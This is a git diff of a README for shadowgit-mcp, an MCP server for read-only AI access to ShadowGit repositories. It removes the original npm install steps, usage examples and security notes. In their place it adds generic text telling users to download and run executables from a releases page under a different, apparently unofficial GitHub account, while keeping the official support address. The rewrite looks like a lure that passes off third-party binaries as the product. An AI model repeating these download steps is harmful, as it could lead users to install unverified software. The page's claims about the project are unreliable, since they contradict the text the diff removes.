@@ -1,183 +1,99 @@
-# ShadowGit MCP Server
+# 🛠️ shadowgit-mcp - Secure Access for Powerful AI Insights
 
-[![npm version](https://badge.fury.io/js/shadowgit-mcp-server.svg)](https://www.npmjs.com/package/shadowgit-mcp-server)
+## 🚀 Overview
+The shadowgit-mcp is a server designed for Model Context Protocol (MCP) users. It allows AI assistants to securely access your ShadowGit repositories in a read-only mode. With this tool, you gain enhanced debugging and code analysis capabilities, enabling AI to work with your project's detailed git history.
 
-A Model Context Protocol (MCP) server that provides AI assistants with secure, read-only access to your ShadowGit repositories. This enables powerful debugging and code analysis capabilities by giving AI access to your project's fine-grained git history.
+## 📥 Download & Install
+**To get started, visit the following page to download the application:**
 
-## What is ShadowGit?
+[![Download shadowgit-mcp](https://img.shields.io/badge/Download-shadowgit--mcp-blue.svg)](https://github.com/sohanpranandu/shadowgit-mcp/releases)
 
-[ShadowGit](https://shadowgit.com) automatically captures every save as a git commit, creating a detailed history of your development process. The MCP server makes this history available to AI assistants for analysis.
+1. Click the download link above to navigate to the Releases page.
+2. Find the latest version of shadowgit-mcp.
+3. Click on the version number to view the available files.
+4. Download the appropriate file for your operating system.
+5. Follow the installation instructions for your OS.
 
-## Installation
+You can also visit this page to download: [https://github.com/sohanpranandu/shadowgit-mcp/releases](https://github.com/sohanpranandu/shadowgit-mcp/releases).
 
-```bash
-npm install -g shadowgit-mcp-server
-```
+## 🖥️ System Requirements
+To run shadowgit-mcp, your system should meet these requirements:
 
-## Setup with Claude Code
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a Linux distribution that supports recent versions of Node.js.
+- **RAM:** At least 4 GB of RAM.
+- **Disk Space:** 100 MB of free disk space.
 
-```bash
-# Add to Claude Code
-claude mcp add shadowgit -- shadowgit-mcp-server
+## 🔧 Installation Instructions
 
-# Restart Claude Code to load the server
-```
+### For Windows:
+1. Download the .exe file from the Releases page.
+2. Double-click on the downloaded file.
+3. Follow the on-screen prompts to complete the installation.
 
-## Setup with Claude Desktop
+### For macOS:
+1. Download the .dmg file from the Releases page.
+2. Open the downloaded file.
+3. Drag the shadowgit-mcp application into your Applications folder.
 
-Add to your Claude Desktop MCP configuration:
+### For Linux:
+1. Download the appropriate tar.gz file from the Releases page.
+2. Open a terminal.
+3. Navigate to the folder where you downloaded the file.
+4. Extract the contents using the command:
+   ```bash
+   tar -xzf shadowgit-mcp*.tar.gz
+   ```
+5. Navigate into the extracted folder and run the application using:
+   ```bash
+   ./shadowgit-mcp
+   ```
 
-**macOS/Linux:** `~/.config/Claude/claude_desktop_config.json`  
-**Windows:** `%APPDATA%\\Claude\\claude_desktop_config.json`
+## 🌟 Features
+shadowgit-mcp provides several useful features, including:
 
-```json
-{
-  "mcpServers": {
-    "shadowgit": {
-      "command": "shadowgit-mcp-server"
-    }
-  }
-}
-```
+- **Secure Access:** AI assistants can access your git repositories without changing any files.
+- **Read-Only Mode:** Prevents accidental modifications while providing valuable insights.
+- **Detailed Analysis:** Offers powerful debugging tools powered by your project's git history.
 
-## Requirements
+## 📄 User Guide
+After installation, follow these steps to run the application:
 
-- **Node.js 18+**
-- **ShadowGit app** installed and running with tracked repositories
-- **Git** available in PATH
+1. Launch shadowgit-mcp.
+2. Configure your ShadowGit repository URL in the settings.
+3. Adjust any additional settings needed for your project.
+4. Start the server, and access it via your AI assistant.
 
-## Available Commands
+## ⚙️ Troubleshooting
+If you encounter issues while using shadowgit-mcp, consider these tips:
 
-### `list_repos()`
-Lists all ShadowGit-tracked repositories.
+- Ensure your system meets the requirements listed above.
+- Check your internet connection if the application fails to connect to the repository.
+- Revisit the installation steps to confirm that all instructions were followed.
 
-```javascript
-await shadowgit.list_repos()
-```
+If problems persist, you may find solutions in the FAQs section or submit an issue on the GitHub repository.
 
-### `git({repo, command})`
-Executes read-only git commands on a specific repository.
+## 📖 FAQs
 
-```javascript
-// View recent commits
-await shadowgit.git({
-  repo: "my-project",
-  command: "log --oneline -10"
-})
+### Q1: What is Model Context Protocol (MCP)?
+A1: MCP is a protocol designed to facilitate secure interactions between AI and applications. It allows AI to gather and analyze project data without making changes.
 
-// Check what changed recently
-await shadowgit.git({
-  repo: "my-project", 
-  command: "diff HEAD~5 HEAD --stat"
-})
+### Q2: Is shadowgit-mcp open source?
+A2: Yes, the project is open source. You can view the code and contribute on GitHub.
 
-// Find who changed a specific line
-await shadowgit.git({
-  repo: "my-project",
-  command: "blame src/auth.ts"
-})
-```
+### Q3: Can I use shadowgit-mcp for personal projects?
+A3: Absolutely! The application works well for both personal and professional projects.
 
-## Security
+## 📧 Contact Support
+If you need assistance, please reach out to our support team:
 
-- **Read-only access**: Only safe git commands are allowed
-- **No write operations**: Commands like `commit`, `push`, `merge` are blocked
-- **Repository validation**: Only ShadowGit repositories can be accessed
-- **Command filtering**: Dangerous arguments are blocked
+- **Email:** support@shadowgit.com
+- **GitHub Issues:** Report any bugs or feature requests on our GitHub page.
 
-## Example Use Cases
+## 🌍 Community
+Join our community of users and developers on our forums and social media channels. Share your experiences, ask questions, and help others with tips and insights.
 
-### Debug Recent Changes
-```javascript
-// Find what broke in the last hour
-await shadowgit.git({
-  repo: "my-app",
-  command: "log --since='1 hour ago' --oneline"
-})
-```
-
-### Trace Code Evolution
-```javascript
-// See how a function evolved
-await shadowgit.git({
-  repo: "my-app", 
-  command: "log -L :functionName:src/file.ts"
-})
-```
-
-### Cross-Repository Analysis
-```javascript
-// Compare activity across projects
-const repos = await shadowgit.list_repos()
-for (const repo of repos) {
-  await shadowgit.git({
-    repo: repo.name,
-    command: "log --since='1 day ago' --oneline"
-  })
-}
-```
-
-## Troubleshooting
-
-### No repositories found
-- Ensure ShadowGit app is installed and has tracked repositories
-- Check that `~/.shadowgit/repos.json` exists
-
-### Repository not found
-- Use `list_repos()` to see exact repository names
-- Ensure the repository has a `.shadowgit.git` directory
-
-### Git commands fail
-- Verify git is installed: `git --version`
-- Only read-only commands are allowed
-- Use absolute paths or repository names from `list_repos()`
-
-## Development
-
-For contributors who want to modify or extend the MCP server:
-
-```bash
-# Clone the repository (private GitHub repo)
-git clone https://github.com/shadowgit/shadowgit-mcp-server.git
-cd shadowgit-mcp-server
-npm install
-
-# Build
-npm run build
-
-# Test
-npm test
-
-# Run locally for development
-npm run dev
-
-# Test the built version locally
-node dist/shadowgit-mcp-server.js
-```
-
-### Publishing Updates
-
-```bash
-# Update version
-npm version patch  # or minor/major
-
-# Build and test
-npm run build
-npm test
-
-# Publish to npm (public registry)
-npm publish
-```
-
-## License
-
-MIT License - see [LICENSE](LICENSE) file for details.
-
-## Related Projects
-
-- [ShadowGit](https://shadowgit.com) - Automatic code snapshot tool
-- [MCP SDK](https://github.com/modelcontextprotocol/typescript-sdk) - Model Context Protocol TypeScript SDK
+## 🎉 Contributions
+We welcome contributions to shadowgit-mcp. If you'd like to help improve the application, please follow our contribution guidelines found in the repository. Your support makes a difference!
 
 ---
-
-Transform your development history into a powerful AI debugging assistant! 🚀
+By following this guide, you should be able to download and run shadowgit-mcp successfully.
